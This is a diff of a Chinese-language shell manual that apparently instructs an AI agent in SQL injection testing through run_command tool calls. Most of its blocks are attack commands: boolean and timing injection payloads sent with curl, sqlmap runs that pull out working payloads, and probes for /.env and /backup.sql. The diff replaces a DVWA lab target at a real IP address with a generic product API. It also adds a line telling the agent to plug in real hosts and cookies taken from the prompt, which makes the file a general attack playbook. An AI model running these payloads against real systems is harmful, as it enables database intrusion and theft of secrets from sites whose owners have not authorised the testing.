@@ -22,6 +22,8 @@ description: |
 | `<( ... )` 进程替换 | 写到 temp 文件再读 |
 | `${x^^}` 大小写 | `echo "$x" \| tr a-z A-Z` |
 
+> **容器 host 改写**：脚本里 URL 如果指向宿主机本地服务，把 `127.0.0.1`/`localhost`/私网 IP 改写成 `host.docker.internal:<port>`。详见 `tooling/sqlmap` 手册。
+
 ## 核心模式（必会五种）
 
 ### 1. 管道：上一条工具的 stdout 作下一条的 stdin
@@ -36,7 +38,7 @@ sqlmap -u '...' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload):'
 ### 2. 命令替换：把命令输出作字符串
 
 ```
-LEN=$(curl -s -o /dev/null -w '%{size_download}' 'http://x/y')
+LEN=$(curl -s -o /dev/null -w '%{size_download}' 'http://api.example.com/v1/products?id=1')
 echo "len=$LEN"
 ```
 
@@ -56,7 +58,7 @@ curl -s -f '...' && echo "OK" || echo "fail"
 
 ```
 for i in 1 2 3 4 5; do
-  curl -s -o /dev/null -w "id=$i status=%{http_code}\n" "http://x/y?id=$i"
+  curl -s -o /dev/null -w "id=$i status=%{http_code}\n" "http://api.example.com/v1/products?id=$i"
 done
 ```
 
@@ -64,8 +66,8 @@ done
 
 ```
 for i in $(seq 1 20); do
-  T=$(curl -s -o /dev/null -w '%{size_download}' "http://x/y?id=$i AND 1=1-- -")
-  F=$(curl -s -o /dev/null -w '%{size_download}' "http://x/y?id=$i AND 1=2-- -")
+  T=$(curl -s -o /dev/null -w '%{size_download}' "http://api.example.com/v1/products?id=$i AND 1=1-- -")
+  F=$(curl -s -o /dev/null -w '%{size_download}' "http://api.example.com/v1/products?id=$i AND 1=2-- -")
   echo "id=$i true=$T false=$F"
 done
 ```
@@ -79,19 +81,19 @@ sqlmap -u '...' --batch >/tmp/x.log 2>&1
 
 ## 实用片段
 
-### 提取 cookie 头里的 session
+### 从 cookie 头里抽某个字段
 
 ```
-echo "PHPSESSID=abc; security=low; csrf=xx" | tr ';' '\n' | grep -i phpsessid
-# → PHPSESSID=abc
+echo "session=abc; csrf=xx; theme=dark" | tr ';' '\n' | grep -i session
+# → session=abc
 ```
 
 ### 把多条 payload 的差分一次拍出来
 
 ```
 for p in "1=1" "1=2" "1=3"; do
-  L=$(curl -s -o /dev/null -w "%{size_download}" "http://x/y?id=1 AND $p-- -")
-  T=$(curl -s -o /dev/null -w "%{time_total}" "http://x/y?id=1 AND $p-- -")
+  L=$(curl -s -o /dev/null -w "%{size_download}" "http://api.example.com/v1/products?id=1 AND $p-- -")
+  T=$(curl -s -o /dev/null -w "%{time_total}" "http://api.example.com/v1/products?id=1 AND $p-- -")
   echo "payload=\"$p\" len=$L time=$T"
 done
 ```
@@ -99,7 +101,7 @@ done
 ### 串多个工具：sqlmap 找点 → 把 payload 拎出来
 
 ```
-sqlmap -u 'http://x/y?id=1' -p id --batch --disable-coloring 2>&1 \
+sqlmap -u 'http://api.example.com/v1/products?id=1' -p id --batch --disable-coloring 2>&1 \
   | grep -i payload | head -1 \
   | awk -F': ' '{print $2}'
 ```
@@ -107,18 +109,20 @@ sqlmap -u 'http://x/y?id=1' -p id --batch --disable-coloring 2>&1 \
 ### 看响应 body + 状态码（一次）
 
 ```
-curl -s -D - -o /tmp/body 'http://x/y?id=1' \
+curl -s -D - -o /tmp/body 'http://api.example.com/v1/products?id=1' \
   && echo '---BODY---' \
   && head -c 500 /tmp/body
 ```
 
 ## 实战示例
 
-### 示例 1：DVWA 多 payload 长度差分（一条命令拿全数据）
+> 示例里的 host/path/cookie 都是占位；按 user prompt 里抓到的真实值套用。
+
+### 示例 1：多 payload 长度差分（一条命令拿全数据）
 
 ```
 run_command({
-  "command": "for p in 'AND 1=1' 'AND 1=2' 'AND 1=3' 'OR 1=1'; do L=$(curl -s -o /dev/null -b 'PHPSESSID=abc; security=low' -w '%{size_download}' \"http://49.234.23.42:8888/vulnerabilities/sqli/?id=1' $p-- -&Submit=Submit\"); echo \"payload=$p len=$L\"; done",
+  "command": "for p in 'AND 1=1' 'AND 1=2' 'AND 1=3' 'OR 1=1'; do L=$(curl -s -o /dev/null -b 'session=<token>' -w '%{size_download}' \"http://api.example.com/v1/products?id=1' $p-- -\"); echo \"payload=$p len=$L\"; done",
   "tag": "sh-multi-payload",
   "timeout_seconds": 60
 })
@@ -128,7 +132,7 @@ run_command({
 
 ```
 run_command({
-  "command": "sqlmap -u 'http://x/y?id=1' -p id --cookie='...' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload|back-end DBMS|injectable|vulnerable):' | head -20",
+  "command": "sqlmap -u 'http://api.example.com/v1/products?id=1' -p id --cookie='session=<token>' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload|back-end DBMS|injectable|vulnerable):' | head -20",
   "tag": "sh-sqlmap-grep",
   "timeout_seconds": 240
 })
@@ -138,7 +142,7 @@ run_command({
 
 ```
 run_command({
-  "command": "for path in /admin /api/users /backup.sql /.env; do echo \"$path $(curl -s -o /dev/null -w '%{http_code}' -b '...' http://x$path)\"; done",
+  "command": "for path in /admin /api/users /backup.sql /.env; do echo \"$path $(curl -s -o /dev/null -w '%{http_code}' -b 'session=<token>' http://api.example.com$path)\"; done",
   "tag": "sh-path-probe"
 })
 ```
